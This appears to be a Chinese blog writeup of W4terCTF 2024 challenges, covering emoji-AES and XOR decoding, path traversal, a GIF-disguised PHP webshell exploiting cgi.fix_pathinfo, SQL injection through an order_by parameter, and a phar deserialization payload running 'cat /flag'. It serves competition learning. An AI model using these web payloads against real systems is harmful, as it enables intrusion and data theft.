<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_to_emoji</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 将输入的unicode字符串按逗号分割成列表</span></span><br><span class="line">    unicode_list = input_string.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个空列表，用于存储转换后的emoji</span></span><br><span class="line">    emoji_list = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历unicode列表，将每个unicode转换为对应的emoji，并加入到emoji列表中</span></span><br><span class="line">    <span class="keyword">for</span> unicode_char <span class="keyword">in</span> unicode_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            emoji_char = <span class="built_in">chr</span>(<span class="built_in">int</span>(unicode_char.strip(), <span class="number">16</span>))</span><br><span class="line">            emoji_list.append(emoji_char)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Invalid Unicode: <span class="subst">&#123;unicode_char.strip()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回逗号分隔的转换后的emoji字符串</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(emoji_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">unicode_input = <span class="built_in">input</span>(<span class="string">&quot;请输入以逗号分隔的Unicode字符串：&quot;</span>)</span><br><span class="line">emoji_output = unicode_to_emoji(unicode_input)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的Emoji字符串为：&quot;</span>, emoji_output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅😆🚰📂🌪☺🛩🌏📂🕹🦓🐅🍵🎈😀🔄🚫🎤🦓✅📮🎤🎅🍎🙃🌉🎃🍍🍴👣🚹🤣🐘🏹☺👣💧👣🦓🌿⌨🌪🌏🙃🍵❓☂🌉😆🏹🍵💧🎅👉🌊🚹🚪🍴😎🎃🌪🙃👁🥋👑💧🐘🎤🥋🐘🛩🤣🌉🛩⏩😍❓🐘😡☀😍🙃😁😀😁🚫📂✅☃🚫😎🔪👑😀🕹🚫😍🌪📂👌🍍👌🦓🖐🤣😎🏎🍍🏹🍌🍍🎤☀🏹🎈🚰💧☀✉🏹🍍🦓🎅🍴☂⏩🚪🐍☺🐘😇😡🍵🌏🦓🍵🛩📂👌🏹🗒🗒</span><br></pre></td></tr></table></figure>

<p>这个编码也能比较容易看出，就是emoji-AES编码（emoji-AES编码的开头和结尾是有一定格式的）<br>那么关键就在于密钥，提示中说了密钥为KEY，但是解密一直在报错，奇怪了！密文大概率是没有错误的，也没有其他提示密文要做进一步变换，那么难道是密钥的问题吗？<br>这里出题人给我们挖了一个“小”坑，那就是 KEY 并不是密钥，🔑才是，因为 “I like emoji” 😂<br>解密成功得到如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x???? ⊕ dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl/QW1FAW1/bW57EhQSEF0=</span><br></pre></td></tr></table></figure>

<p>这里的提示倒是蛮明显的，左边是一个4位16进制数，中间是异或，右边是类似于base64的编码。既然只是4位16进制，那么最大也就65536，完全可以爆破得出明文。<br>所以写个代码把所有可能结果输出，然后找就好啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 编码的字符串</span></span><br><span class="line">encoded_data = <span class="string">&#x27;dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl/QW1FAW1/bW57EhQSEF0=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的0x0000到0xFFFF（65535）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10000</span>):</span><br><span class="line">    <span class="comment"># 将整数i转化为两字节形式</span></span><br><span class="line">    key = i.to_bytes(<span class="number">2</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建用于XOR操作的完整密钥，重复匹配数据长度</span></span><br><span class="line">    full_key = key * (<span class="built_in">len</span>(decoded_bytes) // <span class="built_in">len</span>(key)) + key[:<span class="built_in">len</span>(decoded_bytes) % <span class="built_in">len</span>(key)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># XOR解密</span></span><br><span class="line">    xored_result = <span class="built_in">bytes</span>([b ^ k <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(decoded_bytes, full_key)])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 尝试解码为字符串，检查是否有意义的输出（ASCII可打印字符）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_text = xored_result.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        <span class="comment"># 打印可能有意义的结果，并且第一个字符为W，第二个字符为4</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="number">126</span> <span class="keyword">or</span> c <span class="keyword">in</span> <span class="string">&#x27;\r\n\t&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> decoded_text) <span class="keyword">and</span> decoded_text[<span class="number">0</span>] == <span class="string">&#x27;W&#x27;</span> <span class="keyword">and</span> decoded_text[<span class="number">1</span>] == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Key <span class="subst">&#123;i:04x&#125;</span>:&#x27;</span>, decoded_text)</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="comment"># 如果无法解码为ASCII，忽略错误</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>得出明文如下：<br><code>Key 2420: W4terCTF&#123;H@V3_fuN_w1TH_yOUr_F!rSt_5pAM_eMa!I_IN_2024&#125;</code></p>
<h3><span id="pwn">Pwn</span></h3><h4><span id="remember-it-0">Remember It 0</span></h4><p>该题通过访问容器，连续答对10个string后，获得shell，ls发现目录中有flag，再用cat flag 命令得到flag</p>
<h3><span id="web">Web</span></h3><h4><span id="gitzip">GitZip</span></h4><p>本题用到burp抓包，在routes.js文件中发现其中aget(‘&#x2F;:htmlname’) 可以穿透攻击，将htmlname设为..&#x2F;就可以访问到父级目录，通过这个方法，在&#x2F;tmp&#x2F;flag前面不断加..&#x2F;，一层一层往上测试（在哪一层我忘记了，当时没有截图），用burp发送Get请求报文，就能在响应报文中找到flag了。<br>这里有个要注意的点是url必须通过编码再发送请求，否则无法找到flag。</p>
<h4><span id="png-server">PNG Server</span></h4><p>首先用.txt写一个一句话木马，在文件头部加上GIF87a，这样就能识别为gif，可以成功上传<br>然后，注意到php.ini中有cgi.fix_pathinfo&#x3D;1 这么一句话。<br>cgi.fix_pathinfo的解释如下：<br>该选项位于配置文件php.ini中，默认值为1，表示开启。当php遇到文件路径&#x2F;test.png&#x2F;x.php时，若&#x2F;test.png&#x2F;x.php不存在，则会去掉最后的&#x2F;x.php，然后判断&#x2F;test.png是否存在，若存在，则把&#x2F;test.png当做文件&#x2F;test.png&#x2F;x.php解析，如若test.png还不存在如果在其前面还有后缀，继续前面的步骤，以此类推。若是关闭该选项，访问&#x2F;test.jpg&#x2F;x.php 只会返回找不到文件。</p>
<p>所以，上传图片后，用burp抓到响应报文，获取到图片的位置，再使用蚁剑连接，配置如下：<br>利用上面提到的性质，只需要在.png后面再添加 &#x2F;任意名字.php，这样图片马就能被当成php执行了</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/PNG1.png" class>

<p>连接成功后，回到父级目录，就能找到&#x2F;flag</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/PNG2.png" class>

<h4><span id="user-manager">User Manager</span></h4><p>该题在查看main.go的时候，发现在order_by字段作sql注入。<br>首先通过burp抓到一个正常的Get &#x2F;users包，通过修改order_by&#x3D; 后的字段，猜出名字的列名是Name和密码的列名是Secret，然后猜想数据表名叫users，经过测试发现没有问题。<br>然后将order_by&#x3D; 后的字段改为以下语句<br><code>Secret; INSERT INTO users (Name) SELECT Secret FROM users;</code><br>意思是将Secret列的内容全部覆盖Name列内容<br>经过编码后是<br><code>Secret%3B%20INSERT%20INTO%20users%20(Name)%20SELECT%20Secret%20FROM%20users%3B</code><br>这样在响应报文中就会发现，Name字段中出现了flag</p>
<h4><span id="auto-unserialize">Auto Unserialize</span></h4><p>这是一个反序列化的题，在访问到的php代码中发现file_exist的参数是可以人为指定的</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Auto1.png" class>

<p>而且，对于文件的上传也没有很强的检测，只是判断是不是jpg<br>所以可以用 phar反序列化，构造一个 伪装成jpg的 .phar文件，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">command_test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">command_test</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//生成一个phar文件，文件名为shell.phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//将对象user写入到metadata中</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;shell.txt&quot;</span>,<span class="string">&quot;haha&quot;</span>); <span class="comment">//添加压缩文件，文件名字为shell.txt,内容为haha</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行后得到 .phar 文件，用curl 上传文件，发现上传成功</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Auto2.png" class>

<p>然后在网页地址栏输入以下url：<br><code>http://127.0.0.1:49962/?img_file=phar://check.jpg</code></p>
<p>就能获取到flag了</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Auto3.png" class>

<h3><span id="reverse">Reverse</span></h3><h4><span id="shuffle-puts">Shuffle Puts</span></h4><p>使用BinaryAI，输入meow文件，在ASCII字符串中获取到flag</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Shuffle.png" class>

<h4><span id="bruteforceme">BruteforceMe</span></h4><p>首先拿到一个elf文件，放到BinaryAI中，看一下这个文件相关的函数，以下是main函数</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe1.png" class>

<p>可以看到几个提示：<br>1、	flag的长度应该为0x2b，也就是43<br>2、	flag会被FUN_00101209函数处理，然后再被FUN_00101290 函数处理<br>3、	当输入的flag长度正确，即使内容不正确，也会有一个语句提示正确的位数<br>4、	查看这两个函数，都是对flag做一定的转换，主要是第二个函数，是一个base64编码的函数<br>知道了以上信息之后，就可以通过输出，开始猜这个flag是什么。<br>以下编写了一个脚本，实现的效果是，对 { } 内的值猜测</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 待输入的字符串</span></span><br><span class="line">input_string=<span class="string">&quot;W4terCTF&#123;UNr31AT3DN6YtEs_caN_b3_3n1m3RAtEd&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># num</span></span><br><span class="line"><span class="comment"># _6Y</span></span><br><span class="line">input_length=<span class="variable">$&#123;#input_string&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个包含所有可能字符的数组</span></span><br><span class="line">all_chars=(&#123;0..9&#125; &#123;A..Z&#125; &#123;a..z&#125; _)</span><br><span class="line">num_chars=<span class="variable">$&#123;#all_chars[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义修改位置的起点</span></span><br><span class="line">start_position=19</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化最大匹配数字和字符串</span></span><br><span class="line">max_matched=0</span><br><span class="line">max_matched_string=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环调用程序</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>; i&lt;<span class="variable">$num_chars</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> ((j=<span class="number">0</span>; j&lt;<span class="variable">$num_chars</span>; j++)); <span class="keyword">do</span></span><br><span class="line">        <span class="comment"># 构建当前的变化字符串</span></span><br><span class="line">        new_string=<span class="string">&quot;<span class="variable">$&#123;input_string:0:$start_position&#125;</span><span class="variable">$&#123;all_chars[i]&#125;</span><span class="variable">$&#123;all_chars[j]&#125;</span><span class="variable">$&#123;input_string:$((start_position + 2))&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 调用程序并获取输出结果</span></span><br><span class="line">        result=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">        <span class="comment">#echo &quot;$new_string&quot;</span></span><br><span class="line">	<span class="comment">#echo &quot;$result&quot;</span></span><br><span class="line">        <span class="comment"># 提取第一个数字值</span></span><br><span class="line">        matched=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$matched</span> -gt <span class="variable">$max_matched</span> ]; <span class="keyword">then</span></span><br><span class="line">            max_matched=<span class="variable">$matched</span></span><br><span class="line">            max_matched_string=<span class="variable">$new_string</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出第一个数字值最大的字符串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;String with the maximum first digit: <span class="variable">$max_matched_string</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这个脚本是半自动的，每一次都需要自己修改start_position和input_string，在全都过一遍之后发现并没有全对，奇怪了！</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe2.png" class>

<p>其实是本身这个脚本有缺陷，在base64编码中，应该是每3个字符为一组，改成4个字符。而在这个脚本中，其实是每两个字符进行猜测，这样很有可能在某个位置猜错了，所以需要人工排错。<br>那应该怎样做呢？也是通过3个字符为一组这个性质，一个个组排查，比如：<br>先将UNr全部替换为某个一定不会在flag出现的符号，输入程序</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe3.png" class>

<p>发现正确的数量少了4个，说明这个组都是对的。<br>通过这样的方法一步步排查，最终发现是 N6Y 组和 n1m 组出现了问题，此时如何纠错呢？<br>因为每个组的长度为3，那么肯定前两个字符或者后两个字符，是用脚本被一起猜的，比如，在n1m 中，1m是被一起猜出来的。<br>那么现在我对n1这两个位置，用前面的脚本猜，就会发现n1变成了nu，相同的方法用于N6Y ，发现变成 _6Y<br>把新的flag提交到程序，发现终于对了</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe4.png" class>

<p>后记：其实在半自动脚本那里会有更简单的方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 待输入的字符串</span></span><br><span class="line">input_string=<span class="string">&quot;W4terCTF&#123;000000000000000000000000000000000&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个包含所有可能字符的数组</span></span><br><span class="line">all_chars=(&#123;0..9&#125; &#123;A..Z&#125; &#123;a..z&#125; _)</span><br><span class="line">num_chars=<span class="variable">$&#123;#all_chars[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化最大匹配数字和字符串</span></span><br><span class="line">max_matched=16  <span class="comment"># W4terCTF 不需要判断</span></span><br><span class="line">max_matched_string=<span class="string">&quot;W4terCTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次循环遍历三个字符</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">9</span>; i&lt;<span class="number">42</span>; i+=<span class="number">3</span>)); <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 第一个字符</span></span><br><span class="line">    max_string_first_round=<span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">    max_result_first_round=<span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">    break_all=0</span><br><span class="line">    <span class="keyword">for</span> ((j=<span class="number">0</span>; j&lt;<span class="variable">$num_chars</span> &amp;&amp; break_all == <span class="number">0</span>; j++)); <span class="keyword">do</span></span><br><span class="line">        new_string_first_round=<span class="string">&quot;<span class="variable">$&#123;max_string_first_round:0:i&#125;</span><span class="variable">$&#123;all_chars[j]&#125;</span><span class="variable">$&#123;input_string:i+1&#125;</span>&quot;</span></span><br><span class="line">        result_first_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string_first_round</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">        matched_first_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result_first_round</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$matched_first_round</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$max_result_first_round</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            max_matched=<span class="string">&quot;<span class="variable">$matched_first_round</span>&quot;</span></span><br><span class="line">            max_matched_string=<span class="string">&quot;<span class="variable">$new_string_first_round</span>&quot;</span></span><br><span class="line">            max_string_second_round=<span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">            <span class="comment"># 第二个字符</span></span><br><span class="line">            <span class="keyword">for</span> ((k=<span class="number">0</span>; k&lt;<span class="variable">$num_chars</span> &amp;&amp; break_all == <span class="number">0</span>; k++)); <span class="keyword">do</span></span><br><span class="line">                new_string_second_round=<span class="string">&quot;<span class="variable">$&#123;max_string_second_round:0:i+1&#125;</span><span class="variable">$&#123;all_chars[k]&#125;</span><span class="variable">$&#123;input_string:i+2&#125;</span>&quot;</span></span><br><span class="line">                result_second_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string_second_round</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">                matched_second_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result_second_round</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$matched_second_round</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">                    max_matched=<span class="string">&quot;<span class="variable">$matched_second_round</span>&quot;</span></span><br><span class="line">                    max_matched_string=<span class="string">&quot;<span class="variable">$new_string_second_round</span>&quot;</span></span><br><span class="line">                    max_string_third_round=<span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">                    <span class="comment"># 第三个字符</span></span><br><span class="line">                    <span class="keyword">for</span> ((m=<span class="number">0</span>; m&lt;<span class="variable">$num_chars</span> &amp;&amp; break_all == <span class="number">0</span>; m++)); <span class="keyword">do</span></span><br><span class="line">                        new_string_third_round=<span class="string">&quot;<span class="variable">$&#123;max_string_third_round:0:i+2&#125;</span><span class="variable">$&#123;all_chars[m]&#125;</span><span class="variable">$&#123;input_string:i+3&#125;</span>&quot;</span></span><br><span class="line">                        result_third_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string_third_round</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">                        matched_third_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result_third_round</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$matched_third_round</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">                            max_matched=<span class="string">&quot;<span class="variable">$matched_third_round</span>&quot;</span></span><br><span class="line">                            max_matched_string=<span class="string">&quot;<span class="variable">$new_string_third_round</span>&quot;</span></span><br><span class="line">                            <span class="keyword">if</span> (( max_matched % <span class="number">4</span> == <span class="number">0</span> )); <span class="keyword">then</span></span><br><span class="line">                                break_all=1</span><br><span class="line">                                <span class="built_in">break</span></span><br><span class="line">                            <span class="keyword">fi</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">                        <span class="keyword">fi</span></span><br><span class="line">                    <span class="keyword">done</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">done</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Flag is: <span class="variable">$max_matched_string</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>但是这样得出的 flag 还是有问题的，需要人工排查<br><code>Flag is: W4terCTF&#123;UNr31AT3D_6Yt43_00NNb3N3n1m_RAt4d&#125;</code></p>
<h3><span id="crypto">Crypto</span></h3><h4><span id="wish">Wish</span></h4><p>这个题真的搞心态呀，放在密码题，但是并不是密码题做法呀</p>
<p>可以看到，这里是算抽奖概率的函数，如果“运气”足够好，那就能直接返回flag</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish1.png" class>

<p>为什么要说是“运气”呢？仔细看第一行，random是设定seed的，也就是说，每一次抽奖，假如seed确定，结果也是确定的；而且index的值决定了for循环的次数<br>seed是由time决定的，time的范围可以从下面得到：</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish2.png" class>

<p>也就是0到86399<br>所以，写一个python代码，遍历0到86399的seed，看哪一个的算出 abs(random.randint(0, 1919810) - 114514)的值小于等于1，那么 probability的值就能大于10，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">86400</span>):</span><br><span class="line">    random.seed(i)</span><br><span class="line">    <span class="comment"># print(random.randint(0, 1919810))</span></span><br><span class="line">    temp = <span class="built_in">abs</span>(random.randint(<span class="number">0</span>, <span class="number">1919810</span>) - <span class="number">114514</span>)</span><br><span class="line">    <span class="keyword">if</span> temp &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(temp)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得出结果是seed为20544，abs(random.randint(0, 1919810) - 114514)的值为1<br>也就是说，有10%的概率可以抽到，开抽！<br>通过burp设定好报文格式，保证每次的time和index是一样的，格式如下：</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish3.png" class>

<p>抽了n次之后，就发现flag了</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish4.png" class>]]></content>
      <categories>
        <category>竞赛</category>
        <category>CTF</category>
      </categories>
  </entry>
</search>
